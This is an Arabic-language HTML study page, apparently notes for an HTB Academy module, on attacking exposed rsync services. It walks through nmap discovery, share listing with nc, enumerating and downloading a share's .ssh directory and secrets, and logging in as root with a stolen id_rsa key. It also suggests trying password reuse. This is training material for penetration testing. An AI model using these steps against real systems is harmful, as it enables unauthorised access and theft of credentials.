@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rsync — HTB Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;600;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#030810;--surface:rgba(8,15,28,0.75);--border:#0e2035;--accent:#00d4ff;--green:#39ff14;--red:#FF5757;--yellow:#fbbf24;--purple:#a855f7;--text:#b8ccd8;--muted:#3a5060;--white:#e8f4ff;--mono:'IBM Plex Mono',monospace;--sans:'Rajdhani',sans-serif;--tag:'Share Tech Mono',monospace;}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{background:url('https://raw.githubusercontent.com/husein690/roadmap/main/assets/kuggen.jpg') no-repeat center center fixed!important;background-size:cover!important;background-color:#030810!important;}
+body::before{content:''!important;position:fixed!important;inset:0!important;background:rgba(2,6,14,0.72)!important;z-index:0!important;display:block!important;pointer-events:none!important;}
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(0,212,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.02) 1px,transparent 1px);background-size:40px 40px;}
+body{color:var(--text);font-family:var(--sans);min-height:100vh;}
+#glass-particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;}
+.wrap{max-width:1000px;margin:0 auto;padding:32px 18px 80px;position:relative;z-index:2;}
+.back-btn{display:inline-flex;align-items:center;gap:8px;font-family:var(--tag);font-size:10px;letter-spacing:2px;color:var(--muted);text-decoration:none;padding:6px 14px;border:1px solid var(--muted);margin-bottom:28px;transition:all .2s;}
+.back-btn:hover{color:var(--accent);border-color:var(--accent);}
+.hdr{margin-bottom:32px;}
+.hdr-tag{font-family:var(--tag);font-size:10px;color:var(--green);letter-spacing:5px;margin-bottom:12px;animation:blink 2.5s infinite;}
+@keyframes blink{0%,100%{opacity:1}55%{opacity:.3}}
+.hdr-name{font-family:var(--mono);font-size:clamp(22px,4vw,40px);font-weight:700;color:var(--white);letter-spacing:-1px;text-shadow:0 0 40px rgba(0,212,255,.3);}
+.hdr-name span{color:var(--accent);}
+.hdr-sub{font-family:var(--tag);font-size:10px;color:var(--muted);letter-spacing:3px;margin-top:8px;}
+.divider{height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);margin:16px 0;opacity:.3;}
+.facts-bar{display:flex;flex-wrap:wrap;margin-bottom:28px;background:rgba(8,18,36,0.52);backdrop-filter:blur(18px);border:1px solid rgba(0,212,255,0.18);box-shadow:0 4px 30px rgba(0,0,0,.35);}
+.fact{flex:1;min-width:110px;padding:12px 16px;border-left:1px solid var(--border);}
+.fact:last-child{border-left:none;}
+.fact-val{font-family:var(--mono);font-size:16px;font-weight:700;color:var(--accent);}
+.fact-lbl{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;margin-top:3px;}
+.nav{display:flex;flex-wrap:wrap;gap:0;margin-bottom:24px;border-bottom:1px solid var(--border);}
+.nav-btn{font-family:var(--tag);font-size:10px;letter-spacing:1px;padding:12px 16px;background:none;border:none;border-bottom:2px solid transparent;color:var(--muted);cursor:pointer;transition:all .2s;white-space:nowrap;}
+.nav-btn:hover{color:var(--accent);border-bottom-color:var(--accent);}
+.nav-btn.active{color:var(--accent);border-bottom-color:var(--accent);background:rgba(0,212,255,.05);}
+.panel{display:none;}
+.panel.active{display:block;}
+.card{background:rgba(8,18,36,0.48);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.08);padding:18px;margin-bottom:14px;position:relative;}
+.card::before{content:'';position:absolute;top:0;right:0;width:3px;height:100%;background:var(--accent);opacity:.4;}
+.card.danger::before{background:var(--red);opacity:.6;}
+.card-title{font-family:var(--tag);font-size:10px;letter-spacing:2px;color:var(--accent);margin-bottom:12px;text-transform:uppercase;}
+.card-title::before{content:'▸ ';color:var(--green);}
+.code{background:rgba(1,4,9,0.8);border:1px solid var(--border);border-right:3px solid var(--accent);padding:14px;font-family:var(--mono);font-size:11px;color:var(--text);direction:ltr;text-align:left;overflow-x:auto;white-space:pre;line-height:1.7;margin:8px 0;}
+.code .cmd{color:var(--accent);}
+.code .ok{color:var(--green);}
+.code .err{color:var(--red);}
+.code .cmt{color:var(--muted);}
+.code .val{color:var(--yellow);}
+.alert{padding:10px 14px;font-size:11px;margin:8px 0;border-right:3px solid;line-height:1.6;}
+.alert.danger{background:rgba(255,87,87,.08);border-color:var(--red);color:#ff9999;}
+.alert.info{background:rgba(0,212,255,.08);border-color:var(--accent);color:#99e8ff;}
+.alert.warning{background:rgba(251,191,36,.08);border-color:var(--yellow);color:#ffe599;}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0;}
+.info-box{background:rgba(1,4,9,0.6);border:1px solid var(--border);padding:12px;}
+.info-box-title{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+.chain{display:flex;align-items:center;flex-wrap:wrap;margin:12px 0;}
+.chain-step{flex:1;min-width:80px;background:rgba(8,18,36,0.5);border:1px solid var(--border);padding:10px 8px;text-align:center;}
+.chain-step .step-icon{font-size:18px;margin-bottom:4px;}
+.chain-step .step-name{color:var(--text);font-size:10px;font-family:var(--tag);}
+.chain-step .step-sub{color:var(--muted);font-size:9px;margin-top:2px;}
+.chain-step.hl{border-color:var(--red);background:rgba(255,87,87,.05);}
+.chain-arrow{color:var(--accent);font-size:14px;padding:0 4px;}
+.qa{margin:10px 0;}
+.qa-q{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.2);padding:10px 14px;margin-bottom:6px;font-size:12px;color:var(--accent);}
+.qa-q::before{content:'❓ سؤال: ';color:var(--yellow);}
+.qa-a{background:rgba(57,255,20,.05);border:1px solid rgba(57,255,20,.2);padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text);line-height:1.6;}
+.qa-a::before{content:'✅ الجواب: ';color:var(--green);}
+@media(max-width:600px){.grid-2{grid-template-columns:1fr;}.chain{flex-direction:column;}}
+</style>
+</head>
+<body>
+<canvas id="glass-particles"></canvas>
+<div class="wrap">
+
+<a href="protocols.html" class="back-btn">◄ BACK TO PROTOCOLS</a>
+
+<div class="hdr">
+  <div class="hdr-tag">► HTB ACADEMY · MODULE 112 · SECTION 17/21</div>
+  <div class="hdr-name">RSYNC — <span>REMOTE SYNC</span></div>
+  <div class="hdr-sub">FILE SYNC · BACKUP TOOL · SENSITIVE FILE EXPOSURE</div>
+  <div class="divider"></div>
+</div>
+
+<div class="facts-bar">
+  <div class="fact"><div class="fact-val">873</div><div class="fact-lbl">TCP Port</div></div>
+  <div class="fact"><div class="fact-val">Delta</div><div class="fact-lbl">Transfer Algorithm</div></div>
+  <div class="fact"><div class="fact-val" style="color:var(--red)">No Auth</div><div class="fact-lbl">ممكن بدون كلمة سر</div></div>
+  <div class="fact"><div class="fact-val" style="color:var(--red)">id_rsa</div><div class="fact-lbl">Target File</div></div>
+  <div class="fact"><div class="fact-val">SSH</div><div class="fact-lbl">يشتغل فوقه</div></div>
+</div>
+
+<div class="nav">
+  <button class="nav-btn active" onclick="showPanel('overview',this)">Overview</button>
+  <button class="nav-btn" onclick="showPanel('tools',this)">Tools & Commands</button>
+  <button class="nav-btn" onclick="showPanel('attack',this)">Attack Chain</button>
+  <button class="nav-btn" onclick="showPanel('explained',this)">Explained Q&A</button>
+</div>
+
+<!-- OVERVIEW -->
+<div id="panel-overview" class="panel active">
+
+  <div class="card">
+    <div class="card-title">ما هو Rsync؟</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:14px;">
+      أداة سريعة وفعّالة لنسخ الملفات محلياً وعن بعد. تستخدم Delta Transfer Algorithm — ترسل فقط الفرق بين الملفات بدل الملف كامل. تستخدم كثيراً للـ backups والـ mirroring.
+    </p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">Delta Transfer — ليش مهم؟</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;direction:ltr;margin-top:6px;">
+          عندك ملف 1GB على جهازك<br>
+          نسخة قديمة منه على السيرفر<br>
+          ↓<br>
+          Rsync ما يرسل الـ 1GB كامل!<br>
+          يرسل بس الفرق (delta)<br>
+          <span style="color:var(--green);">= أسرع وأوفر في الـ bandwidth ✅</span>
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">ليش خطير في Pentest؟</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          Rsync يستخدم للـ backups<br>
+          <span style="color:var(--red);">الـ backup يحتوي:</span><br>
+          • SSH keys (id_rsa)<br>
+          • ملفات config<br>
+          • /etc/shadow (hashes)<br>
+          • database dumps<br>
+          <span style="color:var(--red);">لو بدون auth = كنز! 💀</span>
+        </div>
+      </div>
+    </div>
+    <div class="alert warning">⚠️ لو حصلت على credentials في pentest ولاقيت Rsync = جرب password reuse عشان تحمّل ملفات حساسة</div>
+  </div>
+
+</div>
+
+<!-- TOOLS -->
+<div id="panel-tools" class="panel">
+
+  <div class="card">
+    <div class="card-title">💻 الأوامر الكاملة</div>
+
+    <div style="font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;margin:10px 0 6px;">STEP 1 — اكتشاف Rsync:</div>
+    <div class="code"><span class="cmd">sudo nmap -sV -p 873 TARGET</span>
+
+PORT    STATE SERVICE VERSION
+<span class="ok">873/tcp open  rsync   (protocol version 31)</span></div>
+
+    <div style="font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;margin:10px 0 6px;">STEP 2 — شوف الـ Shares المتاحة:</div>
+    <div class="code"><span class="cmd">nc -nv TARGET 873</span>
+
+@RSYNCD: 31.0
+<span class="cmd">#list</span>
+<span class="val">dev</span>    Dev Tools    <span class="cmt">← اسم الـ share!</span>
+@RSYNCD: EXIT</div>
+
+    <div style="font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;margin:10px 0 6px;">STEP 3 — Enumerate الـ Share:</div>
+    <div class="code"><span class="cmd">rsync -av --list-only rsync://TARGET/dev</span>
+
+drwxr-xr-x  48  .
+-rw-r--r--   0  build.sh
+-rw-r--r--   0  <span class="val">secrets.yaml</span>    <span class="cmt">← مثير للاهتمام!</span>
+drwx------  54  <span class="err">.ssh</span>             <span class="cmt">← SSH keys! 🎯</span></div>
+
+    <div style="font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;margin:10px 0 6px;">STEP 4 — حمّل كل شيء:</div>
+    <div class="code"><span class="cmt"># تحميل الـ share كامل:</span>
+<span class="cmd">rsync -av rsync://TARGET/dev ./local_copy</span>
+
+<span class="cmt"># تحميل مجلد .ssh فقط:</span>
+<span class="cmd">rsync -av rsync://TARGET/dev/.ssh ./</span>
+
+<span class="cmt"># لو Rsync فوق SSH:</span>
+<span class="cmd">rsync -av -e ssh rsync://TARGET/dev ./</span>
+<span class="cmd">rsync -av -e "ssh -p2222" rsync://TARGET/dev ./</span></div>
+
+    <div style="font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;margin:10px 0 6px;">STEP 5 — استخدم الـ Private Key:</div>
+    <div class="code"><span class="cmd">chmod 600 .ssh/id_rsa</span>
+<span class="cmd">ssh -i .ssh/id_rsa root@TARGET</span>
+<span class="ok">Welcome to Ubuntu!</span>  <span class="cmt">← 💥 RCE!</span></div>
+    <div class="alert danger">🎯 .ssh/id_rsa = private key = دخول مباشر على SSH بدون باسورد!</div>
+  </div>
+
+</div>
+
+<!-- ATTACK CHAIN -->
+<div id="panel-attack" class="panel">
+
+  <div class="card">
+    <div class="card-title">⛓️ Attack Chain</div>
+    <div class="chain">
+      <div class="chain-step"><div class="step-icon">🔍</div><div class="step-name">Nmap</div><div class="step-sub">Port 873</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">📋</div><div class="step-name">List Shares</div><div class="step-sub">nc -nv</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🔎</div><div class="step-name">Enumerate</div><div class="step-sub">--list-only</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">⬇️</div><div class="step-name">Download</div><div class="step-sub">.ssh/id_rsa</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step hl"><div class="step-icon">💥</div><div class="step-name">SSH Access</div><div class="step-sub">-i id_rsa</div></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- EXPLAINED Q&A -->
+<div id="panel-explained" class="panel">
+
+  <div class="card">
+    <div class="card-title">🌐 Q&A</div>
+    <div class="qa">
+      <div class="qa-q">ليش Rsync خطير في الـ pentest؟</div>
+      <div class="qa-a">لأنه يستخدم للـ backups — والـ backup يحتوي على كل شيء: SSH keys, ملفات config, /etc/shadow, database dumps. لو Rsync مفتوح بدون authentication = تحمّل كل هاي الملفات الحساسة مجاناً.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">إيش Delta Transfer Algorithm؟</div>
+      <div class="qa-a">بدل ما يرسل الملف كامل، Rsync يقارن الملف الجديد بالقديم ويرسل بس الفرق (delta). ملف 1GB تغير 10MB منه = يرسل 10MB فقط. أسرع بكثير وأوفر في الـ bandwidth.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">إيش تعمل لو حصلت على id_rsa؟</div>
+      <div class="qa-a">chmod 600 id_rsa عشان تغير الصلاحيات للـ private key، بعدين ssh -i id_rsa root@TARGET = دخول مباشر بدون باسورد. الـ chmod مهم لأن SSH يرفض الـ key لو صلاحياته مفتوحة لغيرك.</div>
+    </div>
+  </div>
+
+</div>
+
+</div>
+
+<script>(function(){var c=document.getElementById('glass-particles');if(!c)return;var x=c.getContext('2d'),W,H,pts=[];function resize(){W=c.width=window.innerWidth;H=c.height=window.innerHeight}function spawn(){pts=[];var n=Math.max(80,Math.min(Math.round(W*H/7000),220));for(var i=0;i<n;i++)pts.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.8+0.4,vy:-(Math.random()*0.45+0.15),vx:(Math.random()-0.5)*0.18,a:Math.random()*0.55+0.15})}function draw(){x.clearRect(0,0,W,H);pts.forEach(function(p){x.beginPath();x.arc(p.x,p.y,p.r,0,Math.PI*2);x.fillStyle='rgba(255,255,255,'+p.a+')';x.fill();p.y+=p.vy;p.x+=p.vx;if(p.y<-8){p.y=H+4;p.x=Math.random()*W}if(p.x<0)p.x=W;if(p.x>W)p.x=0});requestAnimationFrame(draw)}resize();spawn();draw();window.addEventListener('resize',function(){resize();spawn()})})();</script>
+<script>
+function showPanel(name,btn){document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));document.getElementById('panel-'+name).classList.add('active');btn.classList.add('active');}
+</script>
+</body>
+</html>
